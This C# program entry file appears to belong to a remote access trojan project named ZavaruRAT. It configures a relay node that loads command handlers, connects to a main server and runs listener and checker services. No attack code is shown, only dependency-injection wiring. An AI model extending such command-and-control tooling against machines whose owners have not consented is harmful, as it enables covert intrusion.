#region

using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using ZavaruRAT.Node;
using ZavaruRAT.Node.Commands.Abstractions;
using ZavaruRAT.Node.Runtime;
using ZavaruRAT.Node.Services;

#endregion

var host = Host.CreateDefaultBuilder(Environment.GetCommandLineArgs());

host.ConfigureServices((app, services) =>
{
    var baseType = typeof(ICommand);
    var commands =
        typeof(Program).Assembly.GetTypes().Where(x => !x.IsInterface && x.IsAssignableTo(baseType)).ToList();

    foreach (var command in commands)
    {
        services.AddSingleton(command);
    }

    services.AddSingleton<NodeCommandsExecutor>(provider =>
                                                    new
                                                        NodeCommandsExecutor(commands,
                                                                             provider
                                                                                 .GetRequiredService<
                                                                                     MainServerClient>(), provider,
                                                                             provider
                                                                                 .GetRequiredService<
                                                                                     ILogger<NodeCommandsExecutor>>())
                                               );

    services
        .AddSingleton<ZavaruClientsStorage>()
        .AddMainServerClient();

    services
        .AddHostedService<ZavaruListenerService>()
        .AddHostedService<ZavaruCheckerService>()
        .AddHostedService<ZavaruNodeService>();
});

await host.RunConsoleAsync();
